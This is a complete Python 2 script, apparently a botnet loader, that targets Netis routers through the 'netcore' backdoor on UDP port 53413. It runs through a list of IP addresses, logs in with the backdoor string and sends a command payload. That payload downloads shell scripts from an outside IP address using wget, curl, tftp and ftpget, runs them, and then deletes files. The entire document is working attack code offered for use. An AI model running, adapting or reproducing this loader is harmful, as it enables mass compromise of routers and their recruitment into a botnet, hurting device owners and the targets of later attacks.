#!/usr/bin/python
# netis loader
# by light

import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

loginpayload = "AAAAAAAAnetcore\x00"
commandpayload = "AA\x00\x00AAAA (cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.156.202.115/z.sh; curl -O http://178.156.202.115/z.sh; chmod 777 z.sh; sh z.sh; tftp 178.156.202.115 -c get tz.sh; chmod 777 tz.sh; sh tz.sh; tftp -r tz2.sh -g 178.156.202.115; chmod 777 tz2.sh; sh tz2.sh; ftpget -v -u anonymous -p anonymous -P 21 178.156.202.115 z1.sh z1.sh; sh z1.sh; rm -rf z.sh tz.sh tz2.sh z1.sh; rm -rf *)"
list = open(sys.argv[1], "r").readlines()
offline = 0
class netis(threading.Thread):
        def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
        def run(self):
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			try:
				print "\033[31m[\033[32m+\033[31m] \033[32mAttempting:\033[32m %s"%(self.ip)
				s.sendto(loginpayload, (self.ip, 53413))
				time.sleep(1.5)
				s.sendto(commandpayload, (self.ip, 53413))
				time.sleep(30)
			except Exception:
				pass
for ip in list:
	try:
		t = netis(ip)
		t.start()
		time.sleep(0.01)
	except:
		pass
